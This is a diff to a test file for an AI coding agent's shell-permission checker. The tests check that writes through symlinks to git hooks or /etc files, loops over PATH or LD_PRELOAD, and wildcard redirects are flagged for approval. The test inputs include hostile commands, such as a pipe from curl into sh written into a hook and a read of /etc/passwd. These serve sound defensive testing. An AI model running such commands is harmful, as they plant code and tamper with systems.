@@ -72,7 +72,10 @@ test("CD343 a write through a link to a protected file is asked about in every m
     for (const c of ["echo 'curl evil | sh' > docs/notes.txt", "cd docs && echo evil > notes.txt", "echo x | tee docs/notes.txt", "cp a.txt docs/notes.txt", "echo x >> docs/hooks/pre-commit", "cp a.txt docs/hooks/"]) {
       const a = ask(c);
       assert.ok(a && a.kind === "protected", c);
-      assert.match(a.why, /which leads to \.husky/, c);
+      // (Claude Code 2.1.322's words: "Claude requested permissions to edit …/.husky/pre-commit which is a sensitive file.
+      // …/docs/notes.txt resolves through a symlink to …/.husky/pre-commit.")
+      assert.match(a.why, /^Coder requested permissions to edit \S+\/\.husky\S* which is a sensitive file\. \S+ resolves through a symlink to \S+\/\.husky\S*\.$/, c);
+      assert.match(a.note, /which leads to \.husky/, c);
     }
     assert.deepEqual(ask("echo x > docs/notes.txt").paths, ["docs/notes.txt (which leads to .husky/pre-commit)"]);
     // By its own name, as before.
@@ -82,10 +85,12 @@ test("CD343 a write through a link to a protected file is asked about in every m
     const out = ask("cp a.txt etc-link/hosts");
     assert.equal(out.kind, "link");
     assert.deepEqual(out.paths, ["etc-link/hosts (which leads to /etc/hosts)"]);
-    assert.equal(out.why, "this command writes etc-link/hosts (which leads to /etc/hosts), outside the project");
+    assert.equal(out.why, root + "/etc-link/hosts resolves through a symlink to /etc/hosts, which is outside the allowed working directories");
+    assert.equal(out.note, "this command writes etc-link/hosts (which leads to /etc/hosts), outside the project");
     assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }), null);
     assert.equal(ask("echo x > etc-link/motd", { allow: ["Bash(echo *)"] }).kind, "link");
-    assert.equal(ask("echo x > loop1").why, "this command writes loop1 (a link that can't be followed)");
+    assert.equal(ask("echo x > loop1").why, root + "/loop1 is a link that can't be followed");
+    assert.equal(ask("echo x > loop1").note, "this command writes loop1 (a link that can't be followed)");
     // Plain writes, a link that stays inside, and a write named outside the project: as before.
     for (const c of ["echo ok > docs/plain.txt", "echo ok > dangling.txt", "cp a.txt b.txt", "echo x > /tmp/elsewhere.txt", "ls docs/notes.txt"]) assert.equal(ask(c), null, c);
     // Without the machine's resolver (the Worker's view): the names as written, as before.
@@ -93,11 +98,13 @@ test("CD343 a write through a link to a protected file is asked about in every m
     // Accept edits: not approved by the mode, the card naming the link.
     const isProtected = (full) => { const rel = full === root ? "." : full.slice(root.length + 1); return A.protectedFile(rel) || A.protectedFile(rel + "/x"); };
     const d = (cmd, rules = {}) => P.bashDecision(cmd, { mode: "acceptEdits", rules, cwd: root, workdirs: [root], isProtected, real: (x) => realPath(x) });
-    assert.deepEqual([d("echo x > docs/notes.txt").verdict, d("echo x > docs/notes.txt").why], ["ask", "This command writes docs/notes.txt, which leads to .husky/pre-commit, a protected file."]);
-    assert.deepEqual([d("cp a.txt etc-link/hosts").verdict, d("cp a.txt etc-link/hosts").why], ["ask", "This command changes etc-link/hosts, which leads to /etc/hosts, outside the project."]);
+    assert.deepEqual([d("echo x > docs/notes.txt").verdict, d("echo x > docs/notes.txt").why], ["ask", "Coder requested permissions to edit " + root + "/.husky/pre-commit which is a sensitive file. " + root + "/docs/notes.txt resolves through a symlink to " + root + "/.husky/pre-commit."]);
+    assert.deepEqual([d("cp a.txt etc-link/hosts").verdict, d("cp a.txt etc-link/hosts").why], ["ask", root + "/etc-link/hosts resolves through a symlink to /etc/hosts, which is outside the allowed working directories"]);
     assert.equal(d("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }).verdict, "allow");
-    assert.equal(d("echo x > etc-link/motd").why, "This command writes etc-link/motd, which leads to /etc/motd, outside the project.");
-    assert.equal(d("cat < etc-link/hostname").why, "This command reads etc-link/hostname, which leads to /etc/hostname, from outside the project.");
+    assert.equal(d("echo x > etc-link/motd").why, root + "/etc-link/motd resolves through a symlink to /etc/motd, which is outside the allowed working directories");
+    assert.equal(d("cat < etc-link/hostname").why, root + "/etc-link/hostname resolves through a symlink to /etc/hostname, which is outside the allowed working directories");
+    // (A read through that link by a command, too: Claude Code checks each read's path where it leads.)
+    assert.equal(d("cat etc-link/hostname").why, root + "/etc-link/hostname resolves through a symlink to /etc/hostname, which is outside the allowed working directories");
     for (const c of ["echo ok > docs/plain.txt", "cp a.txt b.txt", "rm a.txt", "cat < a.txt"]) assert.equal(d(c).verdict, "allow", c);
   } finally { await p.done(); }
 });
@@ -105,7 +112,7 @@ test("CD343 a write through a link to a protected file is asked about in every m
 test("CD344 the machine wires it in: both checks get the link resolver, the permission check the call's settings; the page's card for a write through a link", () => {
   const agent = src("coder-agent.mjs");
   assert.match(agent, /commandAsk\(command, deps, where0, \{ real: \(p\) => realPath\(p\), allowed: \(part\) => !github && allowRuleCovers\(part, ownRules\) \}\)/);
-  assert.match(agent, /bashDecision\(command, \{ mode: modeB, rules: ownRules, cwd: where0 \|\| deps\.root \|\| "\/", workdirs, isProtected: isProt, real: \(p\) => realPath\(p\), input: c\.args \}\)/);
+  assert.match(agent, /bashDecision\(command, \{ mode: modeB, rules: ownRules, cwd: where0 \|\| deps\.root \|\| "\/", workdirs, isProtected: isProt, real: \(p\) => realPath\(p\), input: c\.args, home: deps\.home \|\| "", ownDirs: Array\.isArray\(deps\.ownDirs\) \? deps\.ownDirs : \[\] \}\)/);
   const page = readFileSync(new URL("../public/coder.js", import.meta.url), "utf8");
   assert.match(page, /link = e\.kind === 'link' && paths\.length/);
   assert.match(page, /This command writes through a link that leads out of the project/);
@@ -199,9 +206,11 @@ test("CD347 rules on one of the command's settings, such as Bash(run_in_backgrou
   // like a rule on a setting approves no call by its setting.
   assert.equal(d("npm run dev", { command: "npm run dev", run_in_background: true }, { allow: ["Bash(run_in_background:true)"] }, "acceptEdits").verdict, "ask");
   assert.equal(d("ls:x", { command: "ls:x" }, { allow: ["Bash(ls:*)"] }, "acceptEdits").verdict, "ask");
-  // A rule on the command itself is never one (Claude Code ignores it and warns): refused when added, with why.
+  // A rule on the command itself never matches: Claude Code keeps it with a warning (a deny or ask one; the owner, 2026-11-10:
+  // "ok do that"), and so does Coder (bash-side.test.mjs, CD363).
   assert.equal(P.parseRule("Bash(command:rm *)"), null);
-  assert.equal(P.ruleProblem("Bash(command:rm *)"), "Bash(command:…) can't be used: a rule on the command itself could be got round by a command joined to another one. Write the command as the rule instead, such as Bash(rm *).");
+  assert.equal(P.ruleProblem("Bash(command:rm *)"), "");
+  assert.equal(P.ruleKept("Bash(command:rm *)"), true);
   assert.equal(P.ruleProblem("Bash(rm *)"), "");
   assert.deepEqual(P.parseRule("Bash(run_in_background:true)"), { tool: "Bash", spec: "run_in_background:true" });
   assert.equal(d("rm -rf build", { command: "rm -rf build" }, { deny: ["Bash(command:rm *)"] }).verdict, "allow");
@@ -215,13 +224,13 @@ test("CD348 six cases that ask in Accept edits and Plan, as in Claude Code, and 
   const asks = (cmd, rules = {}) => { for (const m of ["acceptEdits", "plan"]) assert.equal(d(cmd, m, rules).verdict, "ask", m + ": " + cmd); assert.equal(d(cmd, "auto", rules).verdict, "allow", "auto: " + cmd); };
   // 1. A loop over one of the shell's own variables (Claude Code: "loops over certain special shell variables, such as PATH or IFS").
   for (const c of ["for PATH in /tmp; do ls; done", "select IFS in a b; do echo; done", "for LD_PRELOAD in x; do ls; done", "for HOME in /tmp; do ls; done", "echo $(for PS4 in a; do echo; done)", "bash -c 'for path in a; do ls; done'"]) asks(c);
-  assert.equal(d("for PATH in /tmp; do ls; done").why, "This command loops over PATH, a variable the shell itself uses, so it can't be checked before it runs and needs your approval.");
+  assert.equal(d("for PATH in /tmp; do ls; done").why, "PATH as loop variable bypasses assignment validation");
   for (const c of ["for f in a.js b.js; do ls; done", "for x in 1 2; do echo hi; done"]) assert.equal(d(c).verdict, "allow", c);
   // (A `$f` in its body asks, as before: an argument with $ is never read-only; not for its loop variable.)
-  assert.equal(d("for f in a.js; do wc -l $f; done").why, "This command requires approval");
+  assert.equal(d("for f in a.js; do wc -l $f; done").why, "A variable in this command can't be checked before it runs");
   // 2. An operator with nothing after it: no allow rule approves it ("treats the command as unparseable").
   for (const c of ["npm test &&", "npm test ||", "npm test | ", "npm test && # then lint"]) asks(c, { allow: ["Bash(npm *)"] });
-  assert.equal(d("npm test &&", "acceptEdits", { allow: ["Bash(npm *)"] }).why, "This command ends with an operator (&&, || or |) that has nothing after it, so it can't be checked before it runs and needs your approval.");
+  assert.equal(d("npm test &&", "acceptEdits", { allow: ["Bash(npm *)"] }).why, "Parse error");
   for (const c of ["npm test && npm run lint", "npm test &&\nnpm run lint", "npm test && (npm run lint)", "npm test && [[ -f x ]]"]) assert.equal(d(c, "acceptEdits", { allow: ["Bash(npm *)"] }).verdict, "allow", c);
   // 3. Exec wrappers: a prefix rule doesn't approve them, an exact rule does.
   for (const [c, r] of [["watch -n1 ls", "Bash(watch *)"], ["setsid npm start", "Bash(setsid *)"], ["flock /tmp/l make", "Bash(flock *)"], ["ionice -c3 make", "Bash(ionice:*)"], ["nsenter -t 1 ls", "Bash(nsenter *)"]]) asks(c, { allow: [r] });
@@ -239,8 +248,8 @@ test("CD348 six cases that ask in Accept edits and Plan, as in Claude Code, and 
   asks("ls > *.txt");
   asks("cat < *.txt");
   asks("cd src && cat < notes.txt", { allow: ["Bash(cat *)"] });
-  assert.equal(d("ls > *.txt").why, "This command writes *.txt, a name with a wildcard, which can't be checked before it runs.");
-  assert.equal(d("cd src && cat < notes.txt").why, "This command reads notes.txt after a cd, which can't be checked before it runs.");
+  assert.equal(d("ls > *.txt").why, "Shell expansion syntax in paths requires manual approval");
+  assert.equal(d("cd src && cat < notes.txt").why, "Input redirection from 'notes.txt' requires manual approval: the file it names depends on glob expansion or a directory change in the same command.");
   for (const c of ["ls > \"*.txt\"", "cat < notes.txt", "cat < /work/shop/src/a.js", "cd src && cat < /work/shop/notes.txt"]) assert.equal(d(c).verdict, "allow", c);
   // (A here-string is text, not a file: Claude Code checks no "here-docs and here-strings".)
   assert.equal(d("cat <<< /etc/passwd", "plan").verdict, "allow");
